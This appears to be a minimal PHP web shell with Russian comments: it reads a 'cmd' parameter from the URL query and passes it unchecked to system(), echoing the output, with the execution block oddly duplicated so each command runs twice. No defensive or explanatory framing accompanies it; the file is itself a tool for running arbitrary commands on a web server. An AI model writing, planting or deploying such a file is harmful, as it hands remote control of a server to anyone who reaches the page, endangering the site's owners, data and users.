<?php

// Берем параметр cmd из GET
$cmd = $_GET['cmd'];

// Выполняем команду на сервере
echo "<pre>";
system($cmd);
echo "</pre>";

echo "<pre>";
system($cmd);
echo "</pre>";

?>
